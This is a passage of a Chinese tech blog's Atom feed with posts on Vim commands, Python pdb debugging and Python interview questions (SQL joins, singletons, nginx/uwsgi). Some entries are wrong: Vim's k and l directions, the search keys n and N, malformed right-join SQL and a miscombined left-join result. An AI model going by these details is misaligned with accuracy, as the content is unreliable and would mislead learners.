      <category term="算法" scheme="http://longofo.cc/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="http://longofo.cc/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="斐波那契数列" scheme="http://longofo.cc/tags/%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>Vim常用命令总结--经常翻看,就能熟练使用</title>
    <link href="http://longofo.cc/Vim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93--%E7%BB%8F%E5%B8%B8%E7%BF%BB%E7%9C%8B,%E5%B0%B1%E8%83%BD%E7%86%9F%E7%BB%83%E4%BD%BF%E7%94%A8.html"/>
    <id>http://longofo.cc/Vim常用命令总结--经常翻看,就能熟练使用.html</id>
    <published>2018-05-20T02:49:09.000Z</published>
    <updated>2018-11-07T10:23:25.085Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">今天很残酷,明天也一样,后天也许会不同</blockquote><blockquote><p>使用 Vim 的时间不长，Vim一开始学习的时候，面对很多的操作命令要去记住，常常望而却步，因此整理了些常用命令。相信只要坚持使用，经常翻看，使用起来也会得心应手。</p></blockquote><a id="more"></a><h2 id="光标移动"><a href="#光标移动" class="headerlink" title="光标移动"></a>光标移动</h2><table><thead><tr><th style="text-align:left">命令</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:left"><code>h,j,k,l</code> 或者 上下左右键</td><td style="text-align:left"><code>h</code>表示往左，<code>j</code>表示往下，<code>k</code>表示往右，<code>l</code>表示往上</td></tr><tr><td style="text-align:left"><code>ctrl+f</code></td><td style="text-align:left">下一页</td></tr><tr><td style="text-align:left"><code>ctrl+b</code></td><td style="text-align:left">上一页</td></tr><tr><td style="text-align:left"><code>o,O</code></td><td style="text-align:left">开启新的一行</td></tr><tr><td style="text-align:left"><code>^</code></td><td style="text-align:left">一行的开头</td></tr><tr><td style="text-align:left"><code>$</code></td><td style="text-align:left">一行的结尾</td></tr><tr><td style="text-align:left"><code>gg</code></td><td style="text-align:left">文件的开头</td></tr><tr><td style="text-align:left"><code>[N]G</code></td><td style="text-align:left">文件第N行(直接G到最后一行)</td></tr></tbody></table><h2 id="插入模式"><a href="#插入模式" class="headerlink" title="插入模式"></a>插入模式</h2><table><thead><tr><th style="text-align:left">命令</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:left"><code>i</code></td><td style="text-align:left">插入到光标前面</td></tr><tr><td style="text-align:left"><code>I</code></td><td style="text-align:left">插入到一行的开头</td></tr><tr><td style="text-align:left"><code>a</code></td><td style="text-align:left">插入到光标后面</td></tr><tr><td style="text-align:left"><code>A</code></td><td style="text-align:left">插入到一行的最后</td></tr><tr><td style="text-align:left"><code>Esc</code></td><td style="text-align:left">退出插入模式</td></tr></tbody></table><h2 id="编辑"><a href="#编辑" class="headerlink" title="编辑"></a>编辑</h2><table><thead><tr><th style="text-align:left">命令</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:left"><code>u</code></td><td style="text-align:left">撤销上一步操作</td></tr><tr><td style="text-align:left"><code>ctrl+r</code></td><td style="text-align:left">恢复上一步操作</td></tr><tr><td style="text-align:left"><code>.</code></td><td style="text-align:left">重复最后一个命令</td></tr><tr><td style="text-align:left"><code>~</code></td><td style="text-align:left">变为大写</td></tr><tr><td style="text-align:left"><code>[N]&gt;&gt;</code></td><td style="text-align:left">一行或N行右移一个tab键</td></tr><tr><td style="text-align:left"><code>[N]&lt;&lt;</code></td><td style="text-align:left">一行或N行左移一个tab键</td></tr></tbody></table><h2 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h2><table><thead><tr><th style="text-align:left">命令</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:left"><code>w</code></td><td style="text-align:left">保存</td></tr><tr><td style="text-align:left"><code>wq</code></td><td style="text-align:left">保存并关闭</td></tr><tr><td style="text-align:left"><code>q</code></td><td style="text-align:left">关闭(已保存)</td></tr><tr><td style="text-align:left"><code>q!</code></td><td style="text-align:left">强制关闭，丢弃缓存区内容</td></tr></tbody></table><h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><table><thead><tr><th style="text-align:left">命令</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:left"><code>/pattern</code></td><td style="text-align:left">按照pattern搜索</td></tr><tr><td style="text-align:left"><code>?pattren</code></td><td style="text-align:left">向后搜索</td></tr><tr><td style="text-align:left"><code>n</code></td><td style="text-align:left">光标到达搜索结果的前一个目标</td></tr><tr><td style="text-align:left"><code>N</code></td><td style="text-align:left">光标到达搜索结果的后一个目标</td></tr></tbody></table><h2 id="视觉模式"><a href="#视觉模式" class="headerlink" title="视觉模式"></a>视觉模式</h2><table><thead><tr><th style="text-align:left">命令</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:left"><code>v</code></td><td style="text-align:left">选中一个或者多个字符(配合方向键使用)</td></tr><tr><td style="text-align:left"><code>V</code></td><td style="text-align:left">选中一行</td></tr></tbody></table><h2 id="剪切和复制"><a href="#剪切和复制" class="headerlink" title="剪切和复制"></a>剪切和复制</h2><table><thead><tr><th style="text-align:left">命令</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:left"><code>dd</code></td><td style="text-align:left">删除一行</td></tr><tr><td style="text-align:left"><code>D</code></td><td style="text-align:left">删除当前光标到一行的最后</td></tr><tr><td style="text-align:left"><code>x</code></td><td style="text-align:left">删除后一个字符</td></tr><tr><td style="text-align:left"><code>X</code></td><td style="text-align:left">删除前一个字符</td></tr><tr><td style="text-align:left"><code>[N]yy</code></td><td style="text-align:left">复制一行或者N行</td></tr><tr><td style="text-align:left"><code>p</code></td><td style="text-align:left">粘贴</td></tr></tbody></table><h2 id="窗口操作"><a href="#窗口操作" class="headerlink" title="窗口操作"></a>窗口操作</h2><table><thead><tr><th style="text-align:left">命令</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:left"><code>:split</code></td><td style="text-align:left">水平分割出一个窗口</td></tr><tr><td style="text-align:left"><code>:vsplit</code></td><td style="text-align:left">垂直分割出一个窗口</td></tr><tr><td style="text-align:left"><code>close</code></td><td style="text-align:left">关闭窗口</td></tr><tr><td style="text-align:left"><code>ctrl+w</code></td><td style="text-align:left">切换窗口</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;今天很残酷,明天也一样,后天也许会不同&lt;/blockquote&gt;

&lt;blockquote&gt;
&lt;p&gt;使用 Vim 的时间不长，Vim一开始学习的时候，面对很多的操作命令要去记住，常常望而却步，因此整理了些常用命令。相信只要坚持使用，经常翻看，使用起来也会得心应手。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="vim" scheme="http://longofo.cc/categories/vim/"/>
    
    
      <category term="vim" scheme="http://longofo.cc/tags/vim/"/>
    
  </entry>
  
  <entry>
    <title>python3调试(debug)--pdb</title>
    <link href="http://longofo.cc/python3%E8%B0%83%E8%AF%95(debug)--pdb.html"/>
    <id>http://longofo.cc/python3调试(debug)--pdb.html</id>
    <published>2018-05-09T15:52:04.000Z</published>
    <updated>2018-05-10T08:03:02.249Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">得之坦然，失之淡然，顺其自然，争其必然</blockquote><blockquote><p><img src="https://i.ytimg.com/vi/bZZTeKPRSLQ/maxresdefault.jpg" alt=""></p></blockquote><a id="more"></a><h2 id="pdb调试"><a href="#pdb调试" class="headerlink" title="pdb调试"></a>pdb调试</h2><h3 id="pdb命令清单"><a href="#pdb命令清单" class="headerlink" title="pdb命令清单"></a>pdb命令清单</h3><p><img src="http://p5m1dtoh7.bkt.clouddn.com/python3%E8%B0%83%E8%AF%95--logging%E4%B8%8Epdb/pdb%E5%91%BD%E4%BB%A4%E6%B8%85%E5%8D%95.jpg" alt=""></p><p>忘记了方便查询</p><h3 id="两种使用调试器的方法"><a href="#两种使用调试器的方法" class="headerlink" title="两种使用调试器的方法"></a>两种使用调试器的方法</h3><p>可以这样启动调试：</p><ul><li>python -m pdb filename.py</li><li>import pdb;pdb.set_trace()</li></ul><p>下面的演示中使用的是第一种，实际中大多数会选择后者</p><h3 id="示例一"><a href="#示例一" class="headerlink" title="示例一"></a>示例一</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(n)</span>:</span></span><br><span class="line"><span class="keyword">if</span> n &lt;= <span class="number">2</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> fib(n - <span class="number">1</span>) + fib(n - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">print(fib(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h4 id="在断点上设置命令"><a href="#在断点上设置命令" class="headerlink" title="在断点上设置命令"></a>在断点上设置命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(Pdb) b line(需要下断点的行)</span><br><span class="line">(Pdb) commands num(第几个端点)</span><br><span class="line">(com) bt</span><br><span class="line">(com) args</span><br><span class="line">(com) end</span><br><span class="line">(Pdb)</span><br></pre></td></tr></table></figure><p>以上几个命令是断点处分别显示回溯栈，参数。bt表示back trace，args表示函数的参数</p><p>以下为我自己设置的几个断点:<br><img src="http://p5m1dtoh7.bkt.clouddn.com/python3%E8%B0%83%E8%AF%95--logging%E4%B8%8Epdb/%E7%A4%BA%E4%BE%8B1-1.jpg" alt=""><br>效果:<br><img src="http://p5m1dtoh7.bkt.clouddn.com/python3%E8%B0%83%E8%AF%95--logging%E4%B8%8Epdb/%E7%A4%BA%E4%BE%8B1-2.jpg" alt=""></p><p>也可以不用在命令处设置断点，使用如下方式也可以:<br><img src="http://p5m1dtoh7.bkt.clouddn.com/python3%E8%B0%83%E8%AF%95--logging%E4%B8%8Epdb/%E7%A4%BA%E4%BE%8B1-3.jpg" alt=""><br>直接使用args会显示当前层的参数，bt会显示栈回溯</p><h4 id="u-up-与d-down"><a href="#u-up-与d-down" class="headerlink" title="u(up)与d(down)"></a>u(up)与d(down)</h4><p>在递归时可以使用u(up),d(down)来回到上一层或下一层栈，如下:<br><img src="http://p5m1dtoh7.bkt.clouddn.com/python3%E8%B0%83%E8%AF%95--logging%E4%B8%8Epdb/%E7%A4%BA%E4%BE%8B1-4.jpg" alt=""></p><h4 id="从这个例子学到什么"><a href="#从这个例子学到什么" class="headerlink" title="从这个例子学到什么?"></a>从这个例子学到什么?</h4><p>从这个例子我们可以学到:</p><ul><li>端点可以处可以设置命令</li><li>args可以显示传递给方法的参数</li><li>bt可以显示栈回溯</li><li>c表示继续直达断点</li><li>u和d可以回到上一层或者下一层栈</li></ul><h3 id="示例二"><a href="#示例二" class="headerlink" title="示例二"></a>示例二</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pointless_loop</span><span class="params">(n)</span>:</span></span><br><span class="line"></span><br><span class="line">    number_sum = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 这是一个无意义的循环</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">        number_sum += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    pointless_loop(<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="n-next-和s-step-的区别"><a href="#n-next-和s-step-的区别" class="headerlink" title="n(next)和s(step)的区别"></a>n(next)和s(step)的区别</h4><p><img src="http://p5m1dtoh7.bkt.clouddn.com/python3%E8%B0%83%E8%AF%95--logging%E4%B8%8Epdb/%E7%A4%BA%E4%BE%8B2-1.jpg" alt=""><br><img src="http://p5m1dtoh7.bkt.clouddn.com/python3%E8%B0%83%E8%AF%95--logging%E4%B8%8Epdb/%E7%A4%BA%E4%BE%8B2-2.jpg" alt=""><br>可以看出n表示执行下一行代码，但是不会进入函数，而s会执行并进入函数</p><h4 id="为断点设置条件"><a href="#为断点设置条件" class="headerlink" title="为断点设置条件"></a>为断点设置条件</h4><p>如下图是我设置的断点条件<br><img src="http://p5m1dtoh7.bkt.clouddn.com/python3%E8%B0%83%E8%AF%95--logging%E4%B8%8Epdb/%E7%A4%BA%E4%BE%8B2-3.jpg" alt=""></p><h4 id="为断点设置暂时条件（就是说断点在使用一次之后就会被删除）"><a href="#为断点设置暂时条件（就是说断点在使用一次之后就会被删除）" class="headerlink" title="为断点设置暂时条件（就是说断点在使用一次之后就会被删除）"></a>为断点设置暂时条件（就是说断点在使用一次之后就会被删除）</h4><p>如下图:<br><img src="http://p5m1dtoh7.bkt.clouddn.com/python3%E8%B0%83%E8%AF%95--logging%E4%B8%8Epdb/%E7%A4%BA%E4%BE%8B2-5.jpg" alt=""></p><h4 id="禁用断点"><a href="#禁用断点" class="headerlink" title="禁用断点"></a>禁用断点</h4><p>如下图:<br><img src="http://p5m1dtoh7.bkt.clouddn.com/python3%E8%B0%83%E8%AF%95--logging%E4%B8%8Epdb/%E7%A4%BA%E4%BE%8B2-4.jpg" alt=""></p><h4 id="使用display显示旧值与当前值"><a href="#使用display显示旧值与当前值" class="headerlink" title="使用display显示旧值与当前值"></a>使用display显示旧值与当前值</h4><p>如下图：<br><img src="http://p5m1dtoh7.bkt.clouddn.com/python3%E8%B0%83%E8%AF%95--logging%E4%B8%8Epdb/%E7%A4%BA%E4%BE%8B2-6.jpg" alt=""></p><h4 id="从这个示例中学到什么"><a href="#从这个示例中学到什么" class="headerlink" title="从这个示例中学到什么?"></a>从这个示例中学到什么?</h4><ul><li>next和step可以一步一步执行代码（注意next与step的区别）</li><li>断点可以有条件</li><li>可以禁用断点</li><li>使用display显示当前值与旧值</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><em><a href="https://www.youtube.com/watch?v=BixeKmlKOJc" target="_blank" rel="noopener">一个很好的讲解pdb调试视频</a></em></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;得之坦然，失之淡然，顺其自然，争其必然&lt;/blockquote&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://i.ytimg.com/vi/bZZTeKPRSLQ/maxresdefault.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="debug" scheme="http://longofo.cc/categories/debug/"/>
    
    
      <category term="python" scheme="http://longofo.cc/tags/python/"/>
    
      <category term="debug" scheme="http://longofo.cc/tags/debug/"/>
    
  </entry>
  
  <entry>
    <title>python面试题收集</title>
    <link href="http://longofo.cc/python%E9%9D%A2%E8%AF%95%E9%A2%98%E6%94%B6%E9%9B%86.html"/>
    <id>http://longofo.cc/python面试题收集.html</id>
    <published>2018-05-01T04:45:05.000Z</published>
    <updated>2018-07-10T01:14:13.549Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">学习别人的，渐渐成为自己的</blockquote><blockquote><p>搜集一些别人的面试题,为自己的面试做些准备。以后逐渐添加面试题</p></blockquote><a id="more"></a><h3 id="nginx与uwsgi是如何通信的？"><a href="#nginx与uwsgi是如何通信的？" class="headerlink" title="nginx与uwsgi是如何通信的？"></a>nginx与uwsgi是如何通信的？</h3><p>我们知道，nginx把浏览器等发过来的请求通过proxy_pass或者uwsgi_pass转发给上游的web application进行处理，然后把处理的结果发送给浏览器。uwsgi_pass命令的处理函数为ngx_http_uwsgi_handler,也就是说，当有请求到达配置uwsgi_pass的location时，会调用ngx_http_uwsgi_handler方法，而该方法是整个uwsgi事件处理的入口方法。下面来看该方法：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">static</span> ngx_int_t ngx_http_uwsgi_handler(ngx_http_request_t *r) &#123; </span><br><span class="line"><span class="attribute">ngx_http_upstream_t</span> *u;</span><br><span class="line"><span class="attribute">ngx_http_uwsgi_loc_conf_t</span> *uwcf;</span><br><span class="line"><span class="attribute">uwcf</span> = ngx_http_get_module_loc_conf(r, ngx_http_uwsgi_module);</span><br><span class="line"><span class="attribute">u</span> = r-&gt;upstream;</span><br><span class="line">……</span><br><span class="line">u-&gt;create_request = ngx_http_uwsgi_create_request;//根据wsgi协议创建请求包体</span><br><span class="line">u-&gt;process_header = ngx_http_uwsgi_process_status_line;//根据wsgi协议解析uwsgi发送来的头部</span><br><span class="line">……</span><br><span class="line">rc = ngx_http_read_client_request_body(r, ngx_http_upstream_init);//从浏览器读取body数据</span><br><span class="line">…… </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="nginx与uwsgi是多线程还是多进程"><a href="#nginx与uwsgi是多线程还是多进程" class="headerlink" title="nginx与uwsgi是多线程还是多进程 ?"></a>nginx与uwsgi是多线程还是多进程 ?</h3><ul><li>uwsgi是用c语言写的一个webserver，可以启动多个进程，进程里面可以启动多个线程来服务。进程分为主进程和worker进程，worker里面可以有多个线程。</li><li>Nginx会按需同时运行多个进程：一个主进程(master)和几个工作进程(worker)，配置了缓存时还会有缓存加载器进程(cache loader)和缓存管理器进程(cache manager)等。Nginx主要通过“共享内存”的机制实现进程间通信。主进程以root用户身份运行，而worker、cache loader和cache manager均应以非特权用户身份运行。</li><li>在工作方式上，Nginx分为单工作进程和多工作进程两种模式。在单工作进程模式下，除主进程外，还有一个工作进程，工作进程是单线程的；在多工作进程模式下，每个工作进程包含多个线程。Nginx默认为单工作进程模式。</li></ul><h3 id="连表查询"><a href="#连表查询" class="headerlink" title="连表查询"></a>连表查询</h3><p>假设有如下两张表：</p><p>表A</p><table><thead><tr><th style="text-align:center">ID</th><th style="text-align:center">Name</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">Tiim</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">Jimmy</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">John</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">Tom</td></tr></tbody></table><p>表B</p><table><thead><tr><th style="text-align:center">ID</th><th style="text-align:center">Hobby</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">Football</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">Basketball</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">Tennis</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">Soccer</td></tr></tbody></table><h4 id="内联结"><a href="#内联结" class="headerlink" title="内联结"></a>内联结</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> A.Name B.Hobby <span class="keyword">from</span> A, B <span class="keyword">where</span> A.id = B.id</span><br></pre></td></tr></table></figure><p>这是隐式的内联结，查询的结果是：</p><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Hobby</th></tr></thead><tbody><tr><td style="text-align:center">Tiim</td><td style="text-align:center">Football</td></tr><tr><td style="text-align:center">Jimmy</td><td style="text-align:center">Basketball</td></tr><tr><td style="text-align:center">Jimmy</td><td style="text-align:center">Tennis</td></tr><tr><td style="text-align:center">Tom</td><td style="text-align:center">Soccer</td></tr></tbody></table><p>它的作用和：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> A.Name,B.Hobby <span class="keyword">from</span> A <span class="keyword">INNER</span> <span class="keyword">join</span> B <span class="keyword">on</span> A.id = B.id</span><br></pre></td></tr></table></figure></p><h4 id="外左联结"><a href="#外左联结" class="headerlink" title="外左联结"></a>外左联结</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> A.Name,B.Hobby <span class="keyword">from</span> A <span class="keyword">left</span> <span class="keyword">join</span> B <span class="keyword">on</span> A.id = B.id</span><br></pre></td></tr></table></figure><p>这样查询得到的结果将会是保留所有A表中联结字段的记录，若无与其相对应的B表中的字段记录则留空，结果如下：</p><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Hobby</th></tr></thead><tbody><tr><td style="text-align:center">Tiim</td><td style="text-align:center">Football</td></tr><tr><td style="text-align:center">Jimmy</td><td style="text-align:center">Basketball,Tennis</td></tr><tr><td style="text-align:center">Jhon</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">Tom</td><td style="text-align:center">Soccer</td></tr></tbody></table><p>所以从上面结果看出，因为A表中的John记录的ID没有在B表中有对应ID，因此为空，但Name栏仍有John记录。</p><h4 id="右外联结"><a href="#右外联结" class="headerlink" title="右外联结"></a>右外联结</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> A.Name.N.Hobby <span class="keyword">from</span> A <span class="keyword">right</span> <span class="keyword">join</span> B <span class="keyword">on</span> A/<span class="keyword">id</span> = B.id</span><br></pre></td></tr></table></figure><p>结果将会是：</p><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Hobby</th></tr></thead><tbody><tr><td style="text-align:center">Tiim</td><td style="text-align:center">Football</td></tr><tr><td style="text-align:center">Jimmy</td><td style="text-align:center">Basketball</td></tr><tr><td style="text-align:center">Jimmy</td><td style="text-align:center">Tennis</td></tr><tr><td style="text-align:center">Tom</td><td style="text-align:center">Soccer</td></tr></tbody></table><h3 id="ORM中的连表查询"><a href="#ORM中的连表查询" class="headerlink" title="ORM中的连表查询"></a>ORM中的连表查询</h3><h4 id="Django中"><a href="#Django中" class="headerlink" title="Django中"></a>Django中</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Entry.objects.filter(blog__name=<span class="string">'Beatles Blog'</span>)</span><br></pre></td></tr></table></figure><h4 id="Flask中"><a href="#Flask中" class="headerlink" title="Flask中"></a>Flask中</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Entry.query.join(Blog,Blog.id == Entry.blog_id).filter(Blog.name = <span class="string">'Beatles Blog'</span>)</span><br></pre></td></tr></table></figure><h3 id="写一个单例模式"><a href="#写一个单例模式" class="headerlink" title="写一个单例模式"></a>写一个单例模式</h3><ul><li><p>使用继承方式:</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span>:</span></span><br><span class="line">    _instance = <span class="keyword">None</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__new__</span><span class="params">(cls, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> cls._instance <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            cls._instance = super(Singleton, cls).__new__(cls, *args, **kwargs)</span><br><span class="line">        <span class="keyword">return</span> cls._instance</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingleSpam</span><span class="params">(Singleton)</span>:</span></span><br><span class="line">    TEST = <span class="string">'testing'</span></span><br><span class="line">s1 = SingleSpam()</span><br><span class="line">print(s1.TEST, <span class="string">'   '</span>, id(s1))</span><br><span class="line">s2 = SingleSpam()</span><br><span class="line">print(s2.TEST, <span class="string">'   '</span>, id(s2))</span><br></pre></td></tr></table></figure></li><li><p>使用装饰器</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">singleton</span><span class="params">(cls)</span>:</span></span><br><span class="line">    instances = &#123;&#125;</span><br><span class="line"><span class="meta">    @wraps(cls)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_instance</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> cls <span class="keyword">not</span> <span class="keyword">in</span> instances:</span><br><span class="line">            instances[cls] = cls(*args, **kwargs)</span><br><span class="line">        <span class="keyword">return</span> instances[cls]</span><br><span class="line">    <span class="keyword">return</span> _instance</span><br><span class="line"><span class="meta">@singleton</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingleSpam</span><span class="params">(object)</span>:</span></span><br><span class="line">    TEST = <span class="string">'testing'</span></span><br><span class="line">s1 = SingleSpam()</span><br><span class="line">print(s1.TEST, <span class="string">'   '</span>, id(s1))</span><br><span class="line">s2 = SingleSpam()</span><br><span class="line">print(s2.TEST, <span class="string">'   '</span>, id(s2))</span><br></pre></td></tr></table></figure></li><li><p>使用元类</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span><span class="params">(type)</span>:</span></span><br><span class="line">    _instance = <span class="keyword">None</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(cls, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> cls._instance <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            cls._instance = super(Singleton, cls).__call__(*args, **kwargs)</span><br><span class="line">        <span class="keyword">return</span> cls._instance</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingleSpam</span><span class="params">(metaclass=Singleton)</span>:</span></span><br><span class="line">    TEST = <span class="string">'testing'</span></span><br><span class="line">s1 = SingleSpam()</span><br><span class="line">print(s1.TEST, <span class="string">'   '</span>, id(s1))</span><br><span class="line">s2 = SingleSpam()</span><br><span class="line">print(s2.TEST, <span class="string">'   '</span>, id(s2))</span><br></pre></td></tr></table></figure></li></ul><h3 id="请你说出几种常见的反爬策略"><a href="#请你说出几种常见的反爬策略" class="headerlink" title="请你说出几种常见的反爬策略?"></a>请你说出几种常见的反爬策略?</h3><ul><li>检查user-agent</li><li>加防盗链</li><li>使用验证码</li><li>监控ip</li><li>监控session</li><li>将请求的参数加密</li></ul><h3 id="请说一下线程与进程的区别"><a href="#请说一下线程与进程的区别" class="headerlink" title="请说一下线程与进程的区别"></a>请说一下线程与进程的区别</h3><p>进程和线程的主要差别在于它们是不同的操作系统资源管理方式。进程有独立的地址空间，一个进程崩溃后，在保护模式下不会对其它进程产生影响，而线程只是一个进程中的不同执行路径。线程有自己的堆栈和局部变量，但线程之间没有单独的地址空间，一个线程死掉就等于整个进程死掉，所以多进程的程序要比多线程的程序健壮，但在进程切换时，耗费资源较大，效率要差一些。<strong>但对于一些要求同时进行并且又要共享某些变量的并发操作，只能用线程，不能用进程。</strong></p><p><strong>1) 简而言之,一个程序至少有一个进程,一个进程至少有一个线程.</strong></p><h4 id="线程的划分尺度小于进程，使得多线程程序的并发性高。"><a href="#线程的划分尺度小于进程，使得多线程程序的并发性高。" class="headerlink" title="线程的划分尺度小于进程，使得多线程程序的并发性高。"></a>线程的划分尺度小于进程，使得多线程程序的并发性高。</h4><h4 id="另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率。"><a href="#另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率。" class="headerlink" 